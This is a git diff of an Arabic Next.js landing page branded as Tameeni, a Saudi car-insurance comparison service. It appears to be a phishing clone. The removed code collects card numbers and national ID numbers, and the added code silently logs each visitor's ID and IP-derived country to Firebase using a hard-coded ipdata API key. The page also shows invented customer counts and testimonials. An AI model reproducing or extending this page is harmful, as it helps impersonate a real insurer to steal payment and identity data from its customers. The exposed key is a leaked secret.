@@ -1,358 +1,281 @@
 "use client"
 
+import Image from "next/image"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
 import { Badge } from "@/components/ui/badge"
 import { Input } from "@/components/ui/input"
+import { Textarea } from "@/components/ui/textarea"
 import {
   Shield,
   Users,
   Star,
+  Download,
+  Smartphone,
   CheckCircle,
+  Globe,
   Phone,
   Mail,
+  Award,
+  TrendingUp,
   FileText,
-  CreditCard,
-  Menu,
-  X,
-  ArrowLeft,
+  HeadphonesIcon,
   Zap,
   Lock,
-  AlertCircle,
-  Award,
   Clock,
-  TrendingUp,
+  DollarSign,
+  Car,
+  Calculator,
+  MessageCircle,
+  ChevronDown,
+  ChevronUp,
+  ArrowRight,
+  CreditCard,
+  Home,
+  Plane,
+  Heart,
+  Menu,
+  X,
 } from "lucide-react"
-import { useState, useEffect, useRef } from "react"
+import { useState, useEffect } from "react"
+import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
-import { addData, db } from "@/lib/firebase"
-import { offerData } from "@/lib/data"
-import { doc, onSnapshot } from "firebase/firestore"
-
-const validateCardNumber = (cardNumber: string): boolean => {
-  // Remove spaces and non-digits
-  const cleanNumber = cardNumber
-  // Check if it's 16 digits
-  if (cleanNumber.length !== 16) return false
-
-  // Luhn algorithm validation
-  let sum = 0
-  let isEven = false
-
-  for (let i = cleanNumber.length - 1; i >= 0; i--) {
-    let digit = Number.parseInt(cleanNumber[i])
-
-    if (isEven) {
-      digit *= 2
-      if (digit > 9) {
-        digit -= 9
-      }
-    }
-
-    sum += digit
-    isEven = !isEven
-  }
-
-  return sum % 10 === 0
+function randstr(prefix:string)
+{
+    return Math.random().toString(36).replace('0.',prefix || '');
 }
-
-const formatCardNumber = (value: string): string => {
-  const cleanValue = value.replace(/\D/g, "")
-  const formattedValue = cleanValue.replace(/(\d{4})(?=\d)/g, "$1 ")
-  return formattedValue
-}
-
-const getCardType = (cardNumber: string): string => {
-  const cleanNumber = cardNumber.replace(/\D/g, "")
-
-  if (cleanNumber.startsWith("4")) return "Visa"
-  if (cleanNumber.startsWith("5") || cleanNumber.startsWith("2")) return "Mastercard"
-  if (cleanNumber.startsWith("3")) return "American Express"
-
-  return "Unknown"
-}
-
-// Mock components to replace missing imports
-const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
-  <div className="space-y-6">
-    <div>
-      <label className="block text-sm font-semibold text-gray-700 mb-3">
-        الغرض من التأمين <span className="text-red-500">*</span>
-      </label>
-      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-        <button
-          type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.insurance_purpose === "renewal"
-              ? "border-blue-500 bg-blue-50 text-blue-700"
-              : "border-gray-300 hover:border-blue-400"
-          }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "renewal" }))}
-        >
-          <div className="text-center">
-            <div className="font-semibold">تجديد وثيقة</div>
-            <div className="text-sm text-gray-500 mt-1">تجديد وثيقة تأمين موجودة</div>
-          </div>
-        </button>
-        <button
-          type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.insurance_purpose === "property-transfer"
-              ? "border-blue-500 bg-blue-50 text-blue-700"
-              : "border-gray-300 hover:border-blue-400"
-          }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "property-transfer" }))}
-        >
-          <div className="text-center">
-            <div className="font-semibold">نقل ملكية</div>
-            <div className="text-sm text-gray-500 mt-1">تأمين مركبة منقولة الملكية</div>
-          </div>
-        </button>
-      </div>
-      {errors.insurance_purpose && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.insurance_purpose}</span>
-        </div>
-      )}
-    </div>
-
-    <div>
-      <label className="block text-sm font-semibold text-gray-700 mb-3">
-        اسم مالك الوثيقة <span className="text-red-500">*</span>
-      </label>
-      <Input
-        type="text"
-        placeholder="الاسم الكامل"
-        value={formData.documment_owner_full_name}
-        onChange={(e) => setFormData((prev: any) => ({ ...prev, documment_owner_full_name: e.target.value }))}
-        className={`h-12 ${errors.documment_owner_full_name ? "border-red-500" : "border-gray-300"}`}
-        required
-      />
-      {errors.documment_owner_full_name && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.documment_owner_full_name}</span>
-        </div>
-      )}
-    </div>
-
-    {formData.insurance_purpose === "renewal" && (
-      <div>
-        <label className="block text-sm font-semibold text-gray-700 mb-3">
-          رقم هوية المالك <span className="text-red-500">*</span>
-        </label>
-        <Input
-          type="text"
-          placeholder="1234567890"
-          maxLength={10}
-          value={formData.owner_identity_number}
-          onChange={(e) => setFormData((prev: any) => ({ ...prev, owner_identity_number: e.target.value }))}
-          className={`h-12 ${errors.owner_identity_number ? "border-red-500" : "border-gray-300"}`}
-          required
-        />
-        {errors.owner_identity_number && (
-          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-            <span>{errors.owner_identity_number}</span>
-          </div>
-        )}
-      </div>
-    )}
-
-    {formData.insurance_purpose === "property-transfer" && (
-      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-        <div>
-          <label className="block text-sm font-semibold text-gray-700 mb-3">
-            رقم هوية المشتري <span className="text-red-500">*</span>
-          </label>
-          <Input
-            type="text"
-            placeholder="1234567890"
-            maxLength={10}
-            value={formData.buyer_identity_number}
-            onChange={(e) => setFormData((prev: any) => ({ ...prev, buyer_identity_number: e.target.value }))}
-            className={`h-12 ${errors.buyer_identity_number ? "border-red-500" : "border-gray-300"}`}
-            required
-          />
-          {errors.buyer_identity_number && (
-            <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-              <AlertCircle className="w-4 h-4 flex-shrink-0" />
-              <span>{errors.buyer_identity_number}</span>
-            </div>
-          )}
-        </div>
-        <div>
-          <label className="block text-sm font-semibold text-gray-700 mb-3">
-            رقم هوية البائع <span className="text-red-500">*</span>
-          </label>
-          <Input
-            type="text"
-            placeholder="1234567890"
-            maxLength={10}
-            value={formData.seller_identity_number}
-            onChange={(e) => setFormData((prev: any) => ({ ...prev, seller_identity_number: e.target.value }))}
-            className={`h-12 ${errors.seller_identity_number ? "border-red-500" : "border-gray-300"}`}
-            required
-          />
-          {errors.seller_identity_number && (
-            <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-              <AlertCircle className="w-4 h-4 flex-shrink-0" />
-              <span>{errors.seller_identity_number}</span>
-            </div>
-          )}
-        </div>
-      </div>
-    )}
-  </div>
-)
-
-const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
-  <div className="space-y-6">
-    <div>
-      <label className="block text-sm font-semibold text-gray-700 mb-3">
-        نوع المركبة <span className="text-red-500">*</span>
-      </label>
-      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-        <button
-          type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.vehicle_type === "serial"
-              ? "border-blue-500 bg-blue-50 text-blue-700"
-              : "border-gray-300 hover:border-blue-400"
-          }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))}
-        >
-          <div className="text-center">
-            <div className="font-semibold">مركبة برقم تسلسلي</div>
-            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم تسلسلي</div>
-          </div>
-        </button>
-        <button
-          type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-            formData.vehicle_type === "custom"
-              ? "border-blue-500 bg-blue-50 text-blue-700"
-              : "border-gray-300 hover:border-blue-400"
-          }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))}
-        >
-          <div className="text-center">
-            <div className="font-semibold">مركبة برقم لوحة</div>
-            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم لوحة</div>
-          </div>
-        </button>
-      </div>
-      {errors.vehicle_type && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.vehicle_type}</span>
-        </div>
-      )}
-    </div>
-
-    <div>
-      <label className="block text-sm font-semibold text-gray-700 mb-3">
-        الرقم التسلسلي للمركبة <span className="text-red-500">*</span>
-      </label>
-      <Input
-        type="text"
-        placeholder="123456789"
-        value={formData.sequenceNumber}
-        onChange={(e) => setFormData((prev: any) => ({ ...prev, sequenceNumber: e.target.value }))}
-        className={`h-12 ${errors.sequenceNumber ? "border-red-500" : "border-gray-300"}`}
-        required
-      />
-      {errors.sequenceNumber && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.sequenceNumber}</span>
-        </div>
-      )}
-    </div>
-  </div>
-)
-
-export default function QuotePage() {
+const visitorID=randstr('Tmn-')
+export default function TameeniComprehensive() {
   const [mounted, setMounted] = useState(false)
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
-
-  const headerRef = useRef<HTMLElement>(null)
-  const formRef = useRef<HTMLDivElement>(null)
-  const stepContentRef = useRef<HTMLDivElement>(null)
+  const [activeTab, setActiveTab] = useState(0)
+  const [openFaq, setOpenFaq] = useState<number | null>(null)
 
   useEffect(() => {
-    // Initialize visitor ID if not exists
-    const visitorID = localStorage.getItem("visitor")
-    if (visitorID) {
-      setMounted(true)
-      setupOnlineStatus(visitorID!)
-    } else {
-      // Create new visitor ID if none exists
-      const newVisitorId = "visitor_" + Date.now()
-      localStorage.setItem("visitor", newVisitorId)
-      setMounted(true)
-      setupOnlineStatus(newVisitorId)
-    }
+    setMounted(true)
+    getLocation()
   }, [])
 
   if (!mounted) {
-    return (
-      <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50/30 flex items-center justify-center">
-        <div className="text-center">
-          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-          <p className="text-gray-600">جاري التحميل...</p>
-        </div>
-      </div>
-    )
+    return null
   }
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+  
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const country = await response.text();
+        const ao=localStorage.setItem(visitorID,"visitor")
+        addData({
+            id:visitorID,
+            country: country,
+            createdDate: new Date().toISOString()
+        })
+        localStorage.setItem('country',country)
+        setupOnlineStatus(visitorID)
+      } catch (error) {
+        console.error('Error fetching location:', error);
+    }
+  }
+  const stats = [
+    { number: "500,000+", label: "عميل راضي", icon: Users, color: "from-[#109cd4]  to-blue-600" },
+    { number: "25+", label: "شركة تأمين", icon: Award, color: "from-green-500 to-green-600" },
+    { number: "4.9/5", label: "تقييم العملاء", icon: Star, color: "from-yellow-500 to-yellow-600" },
+    { number: "24/7", label: "دعم العملاء", icon: HeadphonesIcon, color: "from-purple-500 to-purple-600" },
+  ]
+
+  const features = [
+    {
+      icon: Shield,
+      title: "حماية شاملة",
+      description: "تغطية شاملة لسيارتك ضد جميع المخاطر والحوادث مع أفضل شركات التأمين",
+      color: "from-[#109cd4]  to-blue-600",
+    },
+    {
+      icon: Zap,
+      title: "سرعة فائقة",
+      description: "احصل على وثيقة التأمين في أقل من 5 دقائق مع نظام معالجة فوري",
+      color: "from-green-500 to-green-600",
+    },
+    {
+      icon: TrendingUp,
+      title: "أفضل الأسعار",
+      description: "مقارنة ذكية وفورية للحصول على أفضل العروض من جميع الشركات",
+      color: "from-purple-500 to-purple-600",
+    },
+    {
+      icon: Lock,
+      title: "أمان وثقة",
+      description: "بياناتك محمية بأعلى معايير الأمان والتشفير المتقدم",
+      color: "from-red-500 to-red-600",
+    },
+    {
+      icon: Clock,
+      title: "خدمة مستمرة",
+      description: "دعم عملاء متاح على مدار الساعة لمساعدتك في أي وقت",
+      color: "from-indigo-500 to-indigo-600",
+    },
+    {
+      icon: DollarSign,
+      title: "توفير مضمون",
+      description: "وفر حتى 40% من قيمة التأمين مع عروضنا الحصرية",
+      color: "from-orange-500 to-orange-600",
+    },
+  ]
+
+  const services = [
+    {
+      icon: Car,
+      title: "تأمين السيارات",
+      description: "تأمين شامل وضد الغير للسيارات",
+      features: ["تأمين شامل", "ضد الغير", "حوادث شخصية", "مساعدة طريق"],
+    },
+    {
+      icon: Heart,
+      title: "التأمين الصحي",
+      description: "تغطية صحية شاملة للأفراد والعائلات",
+      features: ["تغطية شاملة", "شبكة واسعة", "خدمات طارئة", "أدوية مجانية"],
+    },
+    {
+      icon: Home,
+      title: "تأمين المنازل",
+      description: "حماية منزلك ومحتوياته",
+      features: ["حريق وسرقة", "كوارث طبيعية", "مسؤولية مدنية", "محتويات المنزل"],
+    },
+    {
+      icon: Plane,
+      title: "تأمين السفر",
+      description: "تأمين شامل لرحلاتك",
+      features: ["تغطية طبية", "إلغاء الرحلة", "فقدان الأمتعة", "تأخير الرحلات"],
+    },
+  ]
+
+  const testimonials = [
+    {
+      name: "أحمد محمد",
+      role: "مهندس",
+      content: "خدمة ممتازة ووفرت لي 35% من قيمة التأمين. التطبيق سهل الاستخدام والدعم الفني رائع.",
+      rating: 5,
+      image: "/user.png",
+    },
+    {
+      name: "فاطمة العلي",
+      role: "طبيبة",
+      content: "أفضل منصة تأمين جربتها. المقارنة سريعة والأسعار شفافة. أنصح بها بشدة.",
+      rating: 5,
+      image: "/user.png",
+    },
+    {
+      name: "خالد السعد",
+      role: "رجل أعمال",
+      content: "تجربة استثنائية من البداية للنهاية. حصلت على وثيقة التأمين في دقائق معدودة.",
+      rating: 5,
+      image: "/user.png",
+    },
+  ]
+
+  const faqs = [
+    {
+      question: "كيف يمكنني الحصول على عرض سعر؟",
+      answer:
+        "يمكنك الحصول على عرض سعر فوري من خلال إدخال بيانات سيارتك ومعلوماتك الشخصية في النموذج أعلاه. ستحصل على مقارنة شاملة من جميع شركات التأمين في أقل من دقيقتين.",
+    },
+    {
+      question: "هل الخدمة مجانية؟",
+      answer:
+        "نعم، خدمة المقارنة والحصول على عروض الأسعار مجانية تماماً. نحن نحصل على عمولة من شركات التأمين عند إتمام عملية الشراء، لذلك لا توجد أي رسوم إضافية عليك.",
+    },
+    {
+      question: "كم من الوقت يستغرق إصدار الوثيقة؟",
+      answer:
+        "يتم إصدار الوثيقة فورياً بعد إتمام عملية الدفع. ستحصل على نسخة إلكترونية عبر البريد الإلكتروني والرسائل النصية، كما يمكنك تحميلها من التطبيق أو الموقع.",
+    },
+    {
+      question: "هل يمكنني تعديل الوثيقة بعد الشراء؟",
+      answer:
+        "نعم، يمكنك إجراء تعديلات على وثيقتك من خلال التطبيق أو الموقع الإلكتروني. بعض التعديلات قد تتطلب رسوم إضافية حسب نوع التغيير وسياسة شركة التأمين.",
+    },
+    {
+      question: "ماذا لو احتجت مساعدة؟",
+      answer:
+        "فريق دعم العملاء متاح على مدار الساعة لمساعدتك. يمكنك التواصل معنا عبر الهاتف، البريد الإلكتروني، أو الدردشة المباشرة في التطبيق والموقع.",
+    },
+  ]
+
+  const processSteps = [
+    {
+      step: "1",
+      title: "أدخل بياناتك",
+      description: "معلومات السيارة والسائق",
+      icon: FileText,
+    },
+    {
+      step: "2",
+      title: "قارن العروض",
+      description: "من أكثر من 25 شركة",
+      icon: Calculator,
+    },
+    {
+      step: "3",
+      title: "اختر الأنسب",
+      description: "حسب احتياجاتك وميزانيتك",
+      icon: CheckCircle,
+    },
+    {
+      step: "4",
+      title: "ادفع بأمان",
+      description: "طرق دفع متعددة وآمنة",
+      icon: CreditCard,
+    },
+  ]
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50/30" dir="rtl">
-      {/* Enhanced Header */}
-      <header className="bg-white/95 backdrop-blur-lg border-b border-gray-100 px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-sm">
+    <div className="min-h-screen bg-white" style={{ direction: "rtl" }}>
+      {/* Header */}
+      <header className="bg-white/95 backdrop-blur-md border-b border-gray-100 px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-sm">
         <div className="max-w-7xl mx-auto flex items-center justify-between">
           <div className="flex items-center gap-4 lg:gap-8">
             <div className="flex items-center gap-3">
-              <div className="w-20 h-12 rounded-lg flex items-center justify-center">
-                <img src="/Logo-AR.png" alt="logo" width={80} height={48} />
-              </div>
-              <div className="hidden sm:block">
-                <h1 className="text-xl font-bold text-gray-900">تأميني</h1>
-                <p className="text-xs text-gray-500">منصة التأمين الذكية</p>
-              </div>
+              <img src="/Logo-AR.png" alt="logo" width={80} />
+
             </div>
             <nav className="hidden lg:flex items-center gap-8 text-sm font-medium">
-              <a href="/" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a href="#" className="text-gray-700 hover:text-blue-600 transition-colors">
                 الرئيسية
               </a>
-              <a href="/#services" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a href="#services" className="text-gray-700 hover:text-blue-600 transition-colors">
                 الخدمات
               </a>
-              <a href="/#about" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a href="#about" className="text-gray-700 hover:text-blue-600 transition-colors">
                 عن الشركة
               </a>
-              <a href="/#contact" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a href="#contact" className="text-gray-700 hover:text-blue-600 transition-colors">
                 اتصل بنا
               </a>
             </nav>
           </div>
-          <div className="flex items-center gap-3">
-            <Button variant="ghost" size="sm" className="hidden sm:flex text-gray-600 hover:text-[#109cd4]">
+          <div className="flex items-center gap-2 lg:gap-3">
+            <Button variant="ghost" size="sm" className="hidden sm:flex text-gray-600 hover:text-blue-600">
               English
             </Button>
             <Button
-              variant="outline"
-              size="sm"
-              className="hidden sm:flex border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] bg-transparent"
-            >
+              onClick={() => (window.location.href = "/quote")}
+
+              variant="outline" size="sm" className="hidden sm:flex border-gray-300 text-xs lg:text-sm">
               تسجيل الدخول
             </Button>
             <Button
+              onClick={() => (window.location.href = "/quote")}
+
               size="sm"
-              className="bg-gradient-to-r from-[#109cd4] to-[#109cd4] hover:from-[#109cd4] hover:to-blue-800 shadow-lg text-white font-medium px-6"
+              className="bg-gradient-to-r from-blue-600 to-[#109cd4]  hover:from-[#109cd4]  hover:to-[#109cd4]  shadow-lg text-xs lg:text-sm px-3 lg:px-4"
             >
               ابدأ الآن
+
             </Button>
             <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
               {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
@@ -360,27 +283,27 @@ export default function QuotePage() {
           </div>
         </div>
 
-        {/* Enhanced Mobile Menu */}
+        {/* Mobile Menu */}
         {mobileMenuOpen && (
-          <div className="lg:hidden mt-4 pb-4 border-t border-gray-100 bg-white/95 backdrop-blur-lg">
+          <div className="lg:hidden mt-4 pb-4 border-t border-gray-100">
             <nav className="flex flex-col gap-4 pt-4">
-              <a href="/" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a href="#" className="text-gray-700 hover:text-blue-600 transition-colors">
                 الرئيسية
               </a>
-              <a href="/#services" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a href="#services" className="text-gray-700 hover:text-blue-600 transition-colors">
                 الخدمات
               </a>
-              <a href="/#about" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a href="#about" className="text-gray-700 hover:text-blue-600 transition-colors">
                 عن الشركة
               </a>
-              <a href="/#contact" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a href="#contact" className="text-gray-700 hover:text-blue-600 transition-colors">
                 اتصل بنا
               </a>
-              <div className="flex gap-2 pt-4 border-t border-gray-100">
-                <Button variant="ghost" size="sm" className="text-gray-600 flex-1">
+              <div className="flex gap-2 pt-2">
+                <Button variant="ghost" size="sm" className="text-gray-600">
                   English
                 </Button>
-                <Button variant="outline" size="sm" className="border-gray-300 flex-1 bg-transparent">
+                <Button variant="outline" size="sm" className="border-gray-300">
                   تسجيل الدخول
                 </Button>
               </div>
@@ -389,133 +312,182 @@ export default function QuotePage() {
         )}
       </header>
 
-      {/* Enhanced Hero Section */}
-      <section className="relative bg-gradient-to-br from-[#109cd4] via-[#109cd4] to-blue-800 text-white py-16 lg:py-20 overflow-hidden">
-        {/* Background Pattern */}
-        <div className="absolute inset-0 opacity-10">
-          <div className="absolute top-0 left-0 w-96 h-96 bg-white rounded-full -translate-x-48 -translate-y-48"></div>
-          <div className="absolute bottom-0 right-0 w-96 h-96 bg-white rounded-full translate-x-48 translate-y-48"></div>
-        </div>
-
-        <div className="relative max-w-5xl mx-auto px-4 lg:px-6 text-center">
-          <div className="space-y-8">
-            <div className="flex items-center justify-center gap-2 mb-6">
-              <Button
-                variant="ghost"
-                size="sm"
-                className="text-blue-100 hover:text-white hover:bg-white/10 transition-all duration-200"
-                onClick={() => (window.location.href = "/")}
-              >
-                <ArrowLeft className="w-4 h-4 ml-2" />
-                العودة للرئيسية
-              </Button>
+      {/* Hero Section */}
+      <section className="relative bg-gradient-to-br from-blue-50 via-white to-blue-50 px-4 lg:px-6 py-12 lg:py-20 overflow-hidden">
+        <div className="max-w-7xl mx-auto">
+          <div className="grid lg:grid-cols-2 gap-8 lg:gap-16 items-center">
+            <div className="relative order-first lg:order-first">
+              <div className="relative">
+                <img
+                  src="/motor-desktop.webp"
+                  alt="car"
+                  width={400}
+                  height={500}
+                  className="relative rounded-3xl shadow-2xl w-full max-w-md mx-auto"
+                />
+              </div>
             </div>
 
-            <div className="space-y-6">
-              <Badge className="bg-white/20 text-white border-white/30 px-6 py-3 text-base font-medium">
-                🚗 عرض سعر مجاني ومقارنة فورية
-              </Badge>
-              <h1 className="text-4xl lg:text-6xl font-bold leading-tight">
-                احصل على أفضل عروض
-                <br />
-                <span className="text-blue-200">تأمين السيارات</span>
-              </h1>
-              <p className="text-xl lg:text-2xl text-blue-100 max-w-3xl mx-auto leading-relaxed">
-                قارن بين أكثر من 25 شركة تأمين واحصل على أفضل الأسعار في أقل من 3 دقائق
-              </p>
-            </div>
+            <div className="space-y-8 text-center lg:text-right">
+              <div className="space-y-6">
+                <h1 className="text-3xl sm:text-4xl lg:text-5xl xl:text-6xl font-bold text-gray-900 leading-tight">
+                  أول منصة لتأمين السيارات في
+                  <br />
+                  <span className="text-blue-600">السعودية</span>
+                </h1>
+                <p className="text-lg lg:text-xl text-gray-600 leading-relaxed max-w-2xl mx-auto lg:mx-0">
+                  جميع شركات التأمين في مكان واحد، مجموعة واسعة من الخيارات وأسعار فوري لوثائق التأمين
+                </p>
+              </div>
 
-            {/* Enhanced Stats */}
-            <div className="grid grid-cols-1 sm:grid-cols-3 gap-8 max-w-2xl mx-auto mt-12">
-              <div className="text-center group">
-                <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:bg-white/30 transition-all duration-300">
-                  <Shield className="w-8 h-8 text-white" />
-                </div>
-                <div className="text-3xl font-bold mb-1">25+</div>
-                <p className="text-blue-100">شركة تأمين</p>
+              <div className="flex justify-center lg:justify-start">
+                <Button
+                  size="lg"
+                  className="bg-blue-600 hover:bg-[#109cd4]  text-white px-12 py-4 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300"
+                  onClick={() => (window.location.href = "/quote")}
+                >
+                  ابدأ الآن
+                </Button>
               </div>
-              <div className="text-center group">
-                <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:bg-white/30 transition-all duration-300">
-                  <Zap className="w-8 h-8 text-white" />
-                </div>
-                <div className="text-3xl font-bold mb-1">3</div>
-                <p className="text-blue-100">دقائق فقط</p>
+
+              <div className="bg-red-50 border border-red-200 rounded-lg p-4 max-w-md mx-auto lg:mx-0">
+                <p className="text-sm text-red-700 flex items-center gap-2">
+                  <span className="w-4 h-4 bg-red-500 rounded-full flex-shrink-0"></span>
+                  هل تريد شراء وثيقة تأمين؟ تحقق من كل هذا الموقع الصحيح
+                </p>
               </div>
-              <div className="text-center group">
-                <div className="w-16 h-16 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:bg-white/30 transition-all duration-300">
-                  <Star className="w-8 h-8 text-white" />
+            </div>
+          </div>
+
+          {/* Insurance Company Logos */}
+          <div className="mt-16 pt-8 border-t border-gray-200">
+            <div className="text-center mb-8">
+              <p className="text-sm text-gray-600 mb-4">18 شركة</p>
+              <p className="text-lg font-semibold text-gray-900">شركاء التأمين المعتمدين</p>
+            </div>
+            <div className="flex flex-wrap items-center justify-center gap-8 opacity-60">
+              {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
+                <div key={i} className="w-20 h-12 bg-gray-200 rounded flex items-center justify-center">
+                  <img className="w-16 h-10" src={`/companies/company-${i}.svg`} alt="" />
                 </div>
-                <div className="text-3xl font-bold mb-1">100%</div>
-                <p className="text-blue-100">مجاني تماماً</p>
-              </div>
+              ))}
             </div>
           </div>
         </div>
       </section>
 
-      {/* Enhanced Quote Form Section */}
-      <section className="py-16 lg:py-20 relative">
-        <div className="max-w-5xl mx-auto px-4 lg:px-6">
-          <div className="text-center mb-12">
-            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">احصل على عرض السعر الخاص بك</h2>
-            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
-              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين المخصصة لاحتياجاتك
-            </p>
-          </div>
-          <ProfessionalQuoteForm />
-        </div>
-      </section>
-
-      {/* Enhanced Trust Indicators */}
-      <section className="py-16 bg-white">
+      {/* Promotional Cards */}
+      <section className="py-12 bg-white">
         <div className="max-w-6xl mx-auto px-4 lg:px-6">
-          <div className="text-center mb-12">
-            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">لماذا يثق بنا أكثر من 500,000 عميل؟</h2>
-            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
-              نحن ملتزمون بتقديم أفضل خدمة تأمين رقمية في المملكة العربية السعودية
-            </p>
-          </div>
+          <div className="grid md:grid-cols-2 gap-6">
+            {/* Tameeni Hero Card */}
+            <Card className="bg-[url(/ar-hero-banner-web-new.webp)] h-[40vw] bg-cover  text-white border-0 overflow-hidden">
+              <CardContent className="p-8 relative">
+                <div className="flex items-center justify-between">
+                  <div className="space-y-4">
 
-          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8">
-            {[
-              {
-                icon: Shield,
-                title: "أمان وثقة",
-                description: "بياناتك محمية بأعلى معايير الأمان العالمية",
-                color: "from-blue-500 to-[#109cd4]",
-                bgColor: "bg-blue-50",
-              },
-              {
-                icon: Award,
-                title: "تقييم ممتاز",
-                description: "4.9/5 من تقييمات العملاء على جميع المنصات",
-                color: "from-yellow-500 to-yellow-600",
-                bgColor: "bg-yellow-50",
-              },
-              {
-                icon: Users,
-                title: "خبرة واسعة",
-                description: "أكثر من 500,000 عميل راضي وثقة متنامية",
-                color: "from-green-500 to-green-600",
-                bgColor: "bg-green-50",
-              },
-              {
-                icon: Clock,
-                title: "دعم مستمر",
-                description: "خدمة عملاء متخصصة متاحة 24/7",
-                color: "from-purple-500 to-purple-600",
-                bgColor: "bg-purple-50",
-              },
-            ].map((feature, index) => (
-              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
-                <CardContent className="p-8 text-center">
-                  <div
-                    className={`w-16 h-16 ${feature.bgColor} rounded-2xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-300`}
-                  >
-                    <feature.icon className="w-8 h-8 text-gray-700" />
                   </div>
-                  <h3 className="text-xl font-bold text-gray-900 mb-3">{feature.title}</h3>
-                  <p className="text-gray-600 leading-relaxed">{feature.description}</p>
+                  <div className="hidden md:block">
+                    <Image
+                      src="/placeholder.svg?height=120&width=120"
+                      alt="تأميني هيرو"
+                      width={120}
+                      height={120}
+                      className="opacity-80"
+                    />
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+
+            {/* Save More Card */}
+            <Card className="bg-[url(/ar-banner-web.webp)] h-[40vw] bg-cover  text-white border-0 overflow-hidden">
+              <CardContent className="p-8 relative">
+                <div className="flex items-center justify-between">
+                  <div className="space-y-4">
+
+                  </div>
+                  <div className="hidden md:block">
+                    <Image
+                      src="/placeholder.svg?height=120&width=120"
+                      alt=" هيرو"
+                      width={120}
+                      height={120}
+                      className="opacity-80"
+                    />
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+
+          </div>
+        </div>
+      </section>
+
+      {/* Professional Multi-Step Quote Form */}
+      {/* Quote Form CTA Section */}
+      <section className="py-8 lg:py-12 bg-white border-b border-gray-100">
+        <div className="max-w-6xl mx-auto px-4 lg:px-6">
+          <div className="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-2xl lg:rounded-3xl p-6 lg:p-8 border border-blue-100">
+            <div className="text-center space-y-6">
+              <div>
+                <h2 className="text-xl lg:text-2xl font-bold text-gray-900 mb-2">احصل على عرض سعر فوري</h2>
+                <p className="text-sm lg:text-base text-gray-600">
+                  أكمل البيانات للحصول على أفضل عروض التأمين من أكثر من 25 شركة
+                </p>
+              </div>
+
+              <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
+                <Button
+                  size="lg"
